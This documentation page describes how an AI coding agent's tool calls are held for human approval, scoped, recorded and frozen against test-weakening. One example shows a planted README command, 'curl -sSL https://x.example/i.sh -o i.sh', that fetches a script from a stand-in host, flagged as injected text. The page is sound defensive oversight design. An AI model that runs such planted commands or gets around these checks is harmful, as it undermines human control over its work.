+++
title = "Approvals and controls"
description = "Decide calls inline, in an editor or later; how decisions are scoped and recorded with who made them; frozen tests; and accepting, skipping and nudging tasks."
weight = 70

[extra]
group = "Use"
+++

## What needs a person

Every tool call is classified before it runs. The full policy is on the [security page](@/docs/security.md#the-policy); in short:

- **denied, always** — the spec, your check configuration, `.git`, secrets, privilege escalation, git remotes, paths outside the worktree;
- **needs a person** — dependency manifests, existing tests, shells, network tools, recursive deletes, git commands that change state, unlisted commands, MCP tools you have not allowed, and any command that asks for the network;
- **allowed** — reading, writing ordinary source files, your checks, the exact commands of `[commands] allow` and the extensions of a `[commands] allow_prefix` entry.

No approval lifts a denial.

## Inline

In a foreground run at a terminal — in the [dashboard](@/docs/running.md#the-dashboard), or as a prompt with `--plain` — speccoder asks while the attempt waits: what the call does, why it stopped, what it can reach, what the model claimed, and what each answer covers.

```text
△ Approval needed — 001-slugify/T004 Handle Unicode input · turn 8
  Edit this file?  Cargo.toml                                         risk ■■□ medium
      3     3
      4     4   [dependencies]
      5     5   serde = "1"
            6 + unicode-normalization = "0.1"
  Object       file  Cargo.toml
  Why stopped  `Cargo.toml` is a dependency manifest
  Sandbox      a file write — nothing is executed
  Model says   "NFKD normalisation is needed for the Unicode acceptance test"   (a claim)
  1. Yes, once                                                          (y)
  2. Yes, for the rest of T004: this file, any content                  (t)
  3. Yes, for this run: this file, any content, in any task             (r)
  5. No, and tell the model why …                                       (n)
  6. Stop this task here (it waits; decide later)                       (s)
  y t r n s or 1-6 · add a note: "y <note>" · v view all · esc later  >
```

The **Object** lines say exactly what a decision covers: the file a write reaches (and the name as asked, when a symlinked directory makes it another), a command's argv with its hash (`#1a2b3c4d5e6f`), the program it runs and the directory it runs in, an MCP tool with the digest of its definition (`@9f8e7d6c5b4a`). When you approved the same name earlier and it now reaches something else, a `changed since approved:` line says what changed.

An edit shows a diff with line numbers, a new file its first lines, a command its whole argv with working directory and network, an MCP call its arguments; `v` shows everything. What the model wrote is printed with control characters escaped, and its explanation is labelled a claim.

| Key | Does |
|---|---|
| `y` | Runs the call once |
| `t` | Also approves this exact object for the rest of the task, in this run |
| `r` | Also for every later task of this run — never offered for high-risk calls |
| `a` | **Always Allow**: runs a command once and adds exactly its argv to `[commands] allow` (`[sandbox] network_allow` for a network call) — nothing after it runs because of this. Only for a command that is not high risk without the network |
| `n` | Rejects; the reason is required and the model is told it (`n no new dependencies`) |
| `s` | Stops the task: the attempt waits for `task approve` or `task reject`, as in an unattended run |
| `esc` | Decides later: the call keeps waiting; in the dashboard the footer offers it again (`enter`) |

A note after the key (`y use the 0.1 series`) is passed to the model with the call's result.

### Arguments copied from what the model read

When an argument of the call — the whole command line, a written path, an argv element or an MCP argument of six characters or more — occurs verbatim in content the attempt read (a file, search results, command or check output, an MCP result, the repository's agent instructions), the prompt says where it came from and offers **only** `y`, `n` and `s`:

```text
  Copied       contains text read from README.md (turn 2): "curl -sSL https://x.example/i.sh -o i.sh"
```

No "for the task", "for this run" or Always Allow: planted repository text never becomes a standing rule. Your committed spec, plan, tasks and constitution are trusted and never mark an argument. The sources are part of the recorded question, so a replay rebuilds them exactly.

The dashboard's overlay takes the same keys, one keystroke each: `tab` adds a note before `y`, `t` or `r`, and `↑ ↓` scroll the body. In the [web interface](@/docs/web.md#when-a-run-needs-you) the call opens as a sheet with the same keys and the same choices; an editor gets them as ACP permission options (Always Allow is an `allow_always` option named "Always allow exactly this command"). Always Allow writes `speccoder.toml` through the same action in every interface; commit it to put it in force. Calls stopped earlier are approved or rejected from the web interface's Report. Every interface's Approve and Reject name the call they show and its object: when that call has expired, been decided, or another waits now, the decision is refused (`CALL-CHANGED`) and nothing is decided.

The attempt continues in the same turn, and a "for the task" or "for this run" answer also covers the same object later in the run. A waiting prompt costs the run nothing.

### The asking budget

A run prompts you at most `[approvals] budget` times (default 12, `0` never prompts). The prompt that uses the last one says so; after it, a call that needs you does not interrupt: its attempt waits, exactly as for "later", and the call joins the run's one **Needs You** item, *calls waiting together*, grouped as writes, commands, network and MCP. Decide them together:

```sh
speccoder approvals                                          # the batch, its run and digest
speccoder approvals batch run-… approve --digest D [--call ID…] [--resume-asking]
speccoder approvals batch run-… reject --digest D --reason "…"
```

Each listed call is approved **once** (never for the task or the run) and recorded on its own. The digest covers every listed call's object, so a decision on a list that changed since you saw it is refused — a call that left or joined it, or a lane's newer attempt stopped on another object. A lane's stopped call approved here is given to the next attempt of its task alone, which may make it one time; a repeat asks again. Without `--resume-asking` the run keeps its count, so a resumed run waits again at its next call; with it, the run prompts again. The web Needs You item and the dashboard (`B` on a batched call) decide it too. Calls allowed by a rule or a grant never count; a `--no-prompt` run counts nothing.

### Autopilot

A run started from the review with **Approve and Run on Autopilot** (`speccoder review approve --run autopilot`) asks nobody. A call the policy would ask about is refused for that run — `autopilot: not asked — listed for you` — and the attempt goes on; every such call is listed in the run report (`autopilot_denied`) and in Needs You (*Ready to review*). The only grants it holds are the ones you ticked on the sheet: each one object a person approved earlier for this feature — a canonical path, an exact argv with its executable, an MCP tool's digest — shown in full and named by its grant id (`--grant g-…`; `--list-grants` lists them). None is ticked by default and none outlives the run. Denials, rejections and protected paths still win over every grant. Autopilot needs the OS sandbox enforced: with none, or `[sandbox] mode = "off"`, it is refused (`SANDBOX-UNAVAILABLE`).

## Later

With `--no-prompt`, `--json`, without a terminal, or after `s`, the attempt **waits** at the call. Its working tree and everything it did so far are kept, and the run ends `needs_approval`.

```sh
speccoder report --approvals                     # what waits, since and until when
speccoder task approve T003 [--note "…"] [--scope once|task|run]   # default: task
speccoder task reject T003 --reason "no new dependencies"
speccoder run --task T003                        # the attempt continues from that call
```

`task approve` and `task reject` need no model or key. The next `run` continues the **same** attempt: finished model calls and commands are read back from the journal, not repeated, and the call that runs is exactly the one you were shown.

- `--call <id>` picks one waiting call by its id (or a prefix) when there are several; `--all` decides every waiting call of the task, or of the feature, each recorded on its own.
- While one task's attempt waits, the feature's other tasks do not start: they share its worktree.
- A waiting call expires after `[approvals] wait` (default `7d`): it is **denied as expired** — recorded as an expiry, never as anybody's decision — and the attempt continues with the refusal.
- Parallel lanes stop instead of waiting, because their worktree is merged or dropped with the group. The stop is listed with its saved attempt; deciding it lets the next run that attempts the task make the call (the decision then belongs to that run).

## What a decision covers

A decision covers one **resolved object**, never a pattern — once, for the task, or for the run:

| Call | Object |
|---|---|
| a write | the canonical file it reaches (symlinks of existing directories resolved), with any content |
| a command | its exact argv, the directory it runs in and the executable that resolves to |
| a command with the network | the same, with the network |
| an MCP tool | the tool as its server defines it now (the digest of its definition) |

The object is resolved by a recorded step before you are asked, and checked again when the call runs: a write whose file changed in the meantime, or a command whose program did, is refused with "the object changed since it was approved" and asked again next time. A longer argv, another directory, a swapped symlink or a changed tool definition is another object.

**Every grant ends with its run** — "for the task" too. A `speccoder run` is one run from its start; a later invocation that resumes a suspended attempt continues that run (and its grants and asking count). A retry within the run keeps the task's grants; the next run asks again. Earlier decisions stay in the history. Decisions travel in each attempt's recorded input, so a replay sees what the live run saw and asks nobody. A rejection for the task and every policy denial win over any grant.

`approvals.json` from an earlier version (grants by class) is refused by name; `speccoder doctor` says so — remove it to start afresh. Until then the calls a lane stopped are listed as unknown (never as none waiting) and nothing is decided, and a run stops rather than attempt the task with the grants it read before.

A command whose program is a file in the workspace is named with the digest of its content: the model rewriting the script makes another object, asked again. A file without an execute bit is never the program named — the one `PATH` finds after it is, as for the system.

## Who decided

Every decision is a record in the run's journal: **who made it, how speccoder knows that name, through what, when, and what exactly was shown**.

- The name is git's `user.name` in the project, else your operating-system user, else `unknown`. `task accept`'s `Accepted-By` uses the same name.
- How it is known: `asserted` for an answer at the terminal, in the dashboard, in the web interface or with `task approve`/`task reject`; `connected` for one an editor reports over ACP. speccoder authenticates nobody, so it never claims more.
- Through what (`via`): the interface you used — `terminal` (the CLI, its prompts and the dashboard), `web` (the app) or `acp` (an editor, named in `client`: `via acp`, `client Zed`). Decisions recorded by earlier versions as `cli`, `tui` or `dashboard` read as `terminal`, and `editor Zed` as `acp` with client `Zed`.
- An approval holds only for the call it was shown: a decision bound to anything else is refused and the call is presented again.
- A call allowed or denied without asking names the **rule** that decided it (``exact command `cargo test` ``, ``check prefix `cargo nextest run` ``, `workspace write`), never a person; one a person's grant allowed says `task-grant` or `run-grant`; an expired call says `expired`. Every record decided on an object carries it (`object`), so the journal alone tells which object was allowed.

The run report shows it per call (`by`, `operator`, `via`), `report --approvals` lists it (with `client` for an editor), and strict replay reads every decision back without asking anyone.

## Frozen tests

Tests that existed before an attempt are **frozen**: changing them needs approval, because weakening a test is the easiest way to make a check pass. To let attempts add to existing test files without asking:

```toml
[tests]
frozen = "additions"   # default "ask"; changing or removing existing lines still asks
```

Removing a test, or renaming one, is refused outright, also with approval and also for tests inside a source file (`#[cfg(test)]` in `src/lib.rs`): the model is told to keep it, or to report the task blocked when the test contradicts the spec. An obsolete test is yours to remove, in a commit of your own.

## Human controls

```sh
speccoder task accept T004 --reason "done by hand in PR 12"   # tick on your word: shown as attested
speccoder task skip T006 --reason "out of scope"              # runs pass it by; dependents stay blocked
speccoder task skip T006 --undo
speccoder task nudge T005 --note "keep the public API unchanged"   # the next attempts read it
speccoder task nudge T005 --clear
```

An attested task is shown as `attested`, never as `verified`: the report always says whose word a tick rests on.
